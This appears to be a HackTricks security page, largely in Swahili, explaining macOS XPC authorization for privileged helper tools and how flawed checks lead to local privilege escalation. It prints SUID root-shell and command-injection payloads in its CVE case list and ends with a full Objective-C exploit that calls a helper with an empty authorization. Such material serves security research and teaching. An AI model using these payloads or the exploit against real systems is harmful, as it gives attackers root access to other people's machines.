# macOS XPC Idhini

{{#include ../../../../../banners/hacktricks-training.md}}

## XPC Idhini

Apple pia inapendekeza njia nyingine ya kuhalalisha ikiwa mchakato unaojiunga una **idhini ya kuita an exposed XPC method**.

Wakati programu inahitaji **kutekeleza vitendo kama mtumiaji mwenye mamlaka**, badala ya kuendesha app kama mtumiaji mwenye mamlaka, kawaida huweka kama root HelperTool kama huduma ya XPC ambayo inaweza kuitwa kutoka kwa app ili kutekeleza vitendo hivyo. Hata hivyo, app inayoitisha huduma inapaswa kuwa na idhini ya kutosha.

### ShouldAcceptNewConnection always YES

Mfano unaweza kupatikana katika [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). Katika `App/AppDelegate.m` inajaribu **connect** kwa **HelperTool**. Na katika `HelperTool/HelperTool.m` function **`shouldAcceptNewConnection`** **haitaangalii** yoyote ya mahitaji yaliyotajwa hapo awali. Daima inarudisha YES:
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
Kwa maelezo zaidi kuhusu jinsi ya kusanidi ukaguzi huu ipasavyo:

{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### Haki za programu

Hata hivyo, kuna **idhinishaji unaofanyika wakati method kutoka HelperTool inapoitwa**.

The function **`applicationDidFinishLaunching`** kutoka `App/AppDelegate.m` itaunda marejeleo tupu ya idhini baada ya app kuanza. Hii inapaswa kufanya kazi kila wakati.\
Kisha, itajaribu **kuongeza baadhi ya haki** kwa marejeleo hayo ya idhini kwa kuita `setupAuthorizationRights`:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
Kazi `setupAuthorizationRights` kutoka `Common/Common.m` itahifadhi katika auth database `/var/db/auth.db` idhinishaji za programu. Kumbuka jinsi itakavyoongeza tu idhinishaji ambazo bado hazipo kwenye database:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
Kazi `enumerateRightsUsingBlock` ndiyo inayotumika kupata ruhusa za programu, ambazo zimeelezwa katika `commandInfo`:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
Hii ina maana kwamba mwishoni mwa mchakato huu, vibali vilivyotangazwa ndani ya `commandInfo` vitahifadhiwa katika `/var/db/auth.db`. Angalia jinsi unaweza kupata kwa **kila mbinu** ambazo zitahitajika **uthibitisho**, **jina la ruhusa** na **`kCommandKeyAuthRightDefault`**. Huo wa mwisho **unaonyesha nani anaweza kupata haki hii**.

Kuna upeo tofauti kuonyesha nani anaweza kufikia haki. Baadhi yao yamefafanuliwa katika [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) (unaweza kupata [all of them in here](https://www.dssw.co.uk/reference/authorization-rights/)), lakini kwa muhtasari:

<table><thead><tr><th width="284.3333333333333">Jina</th><th width="165">Thamani</th><th>Maelezo</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Kila mtu</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Hakuna mtu</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>Mtumiaji wa sasa anahitaji kuwa admin (ndani ya kikundi cha admin)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Muulize mtumiaji kuthibitisha.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Muulize mtumiaji kuthibitisha. Anatakiwa kuwa admin (ndani ya kikundi cha admin)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Bainisha sheria</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Taja maoni ya ziada kuhusu haki</td></tr></tbody></table>

### Uhakiki wa Haki

Katika `HelperTool/HelperTool.m` kazi **`readLicenseKeyAuthorization`** huangalia kama muita amepewa ruhusa ya **kutekeleza mbinu hiyo** kwa kupiga kazi **`checkAuthorization`**. Kazi hii itahakikisha kwamba **authData** iliyotumwa na mchakato unaoita ina **muundo sahihi** kisha itakagua **kinachohitajika ili kupata haki** ya kuitisha mbinu maalum. Iwapo yote yataenda vizuri **`error` iliyorejeshwa itakuwa `nil`**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
Note kwamba ili **kuangalia mahitaji ya kupata haki** ya kuita njia hiyo function `authorizationRightForCommand` itachunguza tu object iliyotanguliwa awali **`commandInfo`**. Kisha, itaita **`AuthorizationCopyRights`** ili kuangalia **ikiwa ina haki** ya kuita function (kumbuka kwamba flags zinaruhusu mwingiliano na mtumiaji).

Katika kesi hii, ili kuita function `readLicenseKeyAuthorization` `kCommandKeyAuthRightDefault` imewekwa kuwa `@kAuthorizationRuleClassAllow`. Hivyo **mtu yeyote anaweza kuuita**.

### Taarifa za DB

Imetajwa kwamba taarifa hizi zinahifadhiwa katika `/var/db/auth.db`. Unaweza kuorodhesha sheria zote zilizohifadhiwa kwa:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
Kisha, unaweza kuona nani anayeweza kupata haki hiyo kwa:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### Ruhusa za kuruhusu

Unaweza kupata **mipangilio yote ya ruhusa** [**in here**](https://www.dssw.co.uk/reference/authorization-rights/), lakini mchanganyiko ambao hautahitaji mwingiliano wa mtumiaji yatakuwa:

1. **'authenticate-user': 'false'**
- Hii ni ufunguo wa moja kwa moja zaidi. Ikiwa imewekwa kwa `false`, inaonyesha kwamba mtumiaji hahitaji kutoa uthibitisho ili kupata haki hii.
- Hii inatumiwa kwa **mchanganyiko na moja ya 2 zilizo hapa chini au kuonyesha kundi** ambalo mtumiaji lazima awe mwanachama wa.
2. **'allow-root': 'true'**
- Ikiwa mtumiaji anafanya kazi kama root user (ambaye ana ruhusa za juu), na ufunguo huu umewekwa kwa `true`, root user anaweza kupata haki hii bila uthibitisho zaidi. Hata hivyo, kwa kawaida, kufikia hali ya root tayari kunahitaji uthibitisho, hivyo hii sio hali ya "no authentication" kwa watumiaji wengi.
3. **'session-owner': 'true'**
- Ikiwa imewekwa kwa `true`, mwenye session (mtumiaji aliyeingia sasa) atapata haki hii moja kwa moja. Hii inaweza kupitisha uthibitisho wa ziada ikiwa mtumiaji tayari ameingia.
4. **'shared': 'true'**
- Ufunguo huu haukidhi ruhusa bila uthibitisho. Badala yake, ikiwa umewekwa kwa `true`, ina maana kwamba mara haki itakapothibitishwa, inaweza kushirikiwa kati ya michakato mingi bila kila moja kuhitaji kuthibitisha tena. Lakini utoaji wa awali wa haki bado utahitaji uthibitisho isipokuwa ukiunganishwa na funguo nyingine kama `'authenticate-user': 'false'`.

Unaweza [**use this script**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) kupata haki zinazoonekana:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
### Authorization Bypass Mifano za Kesi

- **CVE-2025-65842 – Acustica Audio Aquarius HelperTool**: Huduma ya Mach yenye ruhusa `com.acustica.HelperTool` inakubali kila muunganisho na taratibu yake ya `checkAuthorization:` inaita `AuthorizationCopyRights(NULL, …)`, hivyo yoyote 32‑byte blob inapita. `executeCommand:authorization:withReply:` kisha inaingiza misururu ya maandishi zilizoanishwa kwa koma zinazosimamiwa na attacker ndani ya `NSTask` kama root, ikitengeneza payloads such as:
```bash
"/bin/sh,-c,cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
```
inaweza kwa urahisi kuunda SUID root shell. Maelezo katika [this write-up](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/).
- **CVE-2025-55076 – Plugin Alliance InstallationHelper**: The listener always returns YES and the same NULL `AuthorizationCopyRights` pattern appears in `checkAuthorization:`. Mbinu `exchangeAppWithReply:` inaunganisha ingizo la mshambuliaji ndani ya kamba ya `system()` mara mbili, hivyo kuingiza metacharacters za shell katika `appPath` (mf. `"/Applications/Test.app";chmod 4755 /tmp/rootbash;`) husababisha utekelezaji wa msimbo kama root kupitia Mach service `com.plugin-alliance.pa-installationhelper`. More info [here](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/).
- **CVE-2024-4395 – Jamf Compliance Editor helper**: Kuendesha audit huacha `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist`, hufichua Mach service `com.jamf.complianceeditor.helper`, na hu-export `-executeScriptAt:arguments:then:` bila kuthibitisha `AuthorizationExternalForm` ya muito au code signature. Exploit rahisi `AuthorizationCreate`s marejeo tupu, inaunganisha na `[[NSXPCConnection alloc] initWithMachServiceName:options:NSXPCConnectionPrivileged]`, na huitekeleza method ili kuendesha binaries yoyote kama root. Full reversing notes (plus PoC) in [Mykola Grymalyuk’s write-up](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html).
- **CVE-2025-25251 – FortiClient Mac helper**: FortiClient Mac 7.0.0–7.0.14, 7.2.0–7.2.8 and 7.4.0–7.4.2 accepted crafted XPC messages that reached a privileged helper lacking authorization gates. Kwa sababu helper iliamini `AuthorizationRef` yake yenye hadhi, mtumiaji yeyote wa ndani aliye na uwezo wa kutuma ujumbe kwa service angeweza kuilazimisha kutekeleza mabadiliko ya usanidi au amri yoyote kama root. Details in [SentinelOne’s advisory summary](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/).

#### Rapid triage tips

- When an app ships both a GUI and helper, linganisha code requirements zao na angalia whether `shouldAcceptNewConnection` inafunga listener kwa `-setCodeSigningRequirement:` (au inathibitisha `SecCodeCopySigningInformation`). Kukosa ukaguzi kunatoa mara nyingi matukio ya CWE-863 kama kesi ya Jamf. Muangalizi mfupi unaonekana kama:
```bash
codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
```
- Linganisha kile helper *anafikiri* anakitenga na kile mteja anachotoa. Unapofanya reverse engineering, break kwenye `AuthorizationCopyRights` na thibitisha kwamba `AuthorizationRef` inatokana na `AuthorizationCreateFromExternalForm` (iliyotolewa na mteja) badala ya muktadha wenye privileges wa helper; vinginevyo huenda umepata pattern ya CWE-863 kama zilivyo kesi hapo juu.

## Kufanya reverse engineering kwa idhini

### Kukagua kama EvenBetterAuthorization inatumika

Ikiwa unakuta function: **`[HelperTool checkAuthorization:command:]`** kuna uwezekano mchakato unatumia schema iliyotajwa hapo awali kwa idhini:

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

Kisha, ikiwa function hii inaita functions kama `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree`, inatumia [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).

Kagua **`/var/db/auth.db`** kuona ikiwa inawezekana kupata ruhusa ya kuita kitendo chenye privilage bila mwingiliano wa mtumiaji.

### Mawasiliano ya Protocol

Kisha, unahitaji kupata schema ya protocol ili uweze kuanzisha mawasiliano na XPC service.

Function **`shouldAcceptNewConnection`** inaonyesha protocol inayotolewa:

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

Katika kesi hii, tuna ile ile kama katika EvenBetterAuthorizationSample, [**check this line**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

Ukijua jina la protocol inayotumika, inawezekana dump its header definition kwa:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
Mwishowe, tunahitaji tu kujua **jina la Mach Service iliyofichuliwa** kwa ajili ya kuanzisha mawasiliano nayo. Kuna njia kadhaa za kuipata:

- Katika **`[HelperTool init]`** ambapo unaweza kuona Mach Service ikitumiwa:

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- Katika launchd plist:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Mfano wa Exploit

Katika mfano huu imetengenezwa:

- Ufafanuzi wa protocol na functions
- auth tupu ya kutumia kuomba ufikiaji
- Muunganisho kwa huduma ya XPC
- Wito kwa function ikiwa muunganisho ulifanikiwa
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## Wasaidizi wengine wa vibali vya XPC waliotumika vibaya

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)

## Marejeleo

- [https://theevilbit.github.io/posts/secure_coding_xpc_part1/](https://theevilbit.github.io/posts/secure_coding_xpc_part1/)
- [https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
- [https://www.sentinelone.com/vulnerability-database/cve-2025-25251/](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)
- [https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/)
- [https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/)

{{#include ../../../../../banners/hacktricks-training.md}}
